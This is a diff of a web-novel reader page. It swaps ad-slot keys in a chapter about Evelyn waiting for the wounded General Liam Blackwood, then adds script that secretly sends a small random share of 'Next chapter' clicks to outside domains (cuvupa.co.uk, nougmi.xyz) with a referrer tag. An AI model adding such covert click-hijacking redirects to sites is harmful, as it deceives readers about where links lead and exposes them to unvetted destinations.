@@ -2391,37 +2391,37 @@
                 <p>&#34;I can&#39;t.&#34;</p>
                 <p>&#34;Please don&#39;t worry. The General can handle himself.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>Evelyn whirled around with bloodshot eyes. &#34;Then send someone after him! I&#39;m begging you, Ryan!&#34;</p>
                 <p>His face contorted with conflict. &#34;Our orders are absolute. Aldenrian forces can&#39;t enter Valtorian territory without risking war.&#34;</p>
                 <p>&#34;What about Liam?&#34; She gripped his arms until her knuckles turned white.</p>
                 <p>&#34;The mercenary team remains with him. And General Blackwood has survived worse situations.&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Evelyn collapsed onto the steps, burying her face in her hands as silent sobs wracked her body.</p>
                 <p>Two endless days passed without word. Exhaustion carved hollows beneath her eyes, but terror kept sleep at bay.</p>
                 <p>Then - a midnight knock shattered the silence.</p>
                 <p>She nearly fell scrambling to the door. Ryan stood there, face unreadable.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>&#34;Mrs. Blackwood... he&#39;s back.&#34;</p>
                 <p>Life flooded her veins. &#34;Where? Is he hurt? Take me to him now!&#34;</p>
                 <p>&#34;The military hospital.&#34;</p>
                 <p>Her heart stopped. She was running before he finished speaking, bare feet slapping against cold concrete.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>The hospital door burst open under her frantic hands.</p>
                 <p>There - shirtless on the examination table, being stitched up by a medic - sat Liam. Whole. Alive.</p>
                 <p>Their eyes met across the sterile room. In that suspended moment, a thousand unspoken words passed between them.</p>
                 <p>Evelyn pressed trembling fingers to her lips. The relief nearly buckled her knees.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>&#34;Why the tears?&#34; His voice, though hoarse, wrapped around her like a warm blanket.</p>
                 <p>She couldn&#39;t answer. Not with the sight of those brutal gashes marring his torso.</p>
                 <p>The doctor finished bandaging and turned to her. &#34;The wounds aren&#39;t life-threatening, but they&#39;re serious. Stitches need redressing daily - no water contact. He requires complete rest and these antibiotics.&#34;</p>
                 <p>Evelyn nodded mechanically, her entire world narrowed to the man before her. Alive. Home. Hers.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
             </div>
             
             <div class="font-controls">
@@ -2543,7 +2543,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2559,8 +2559,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
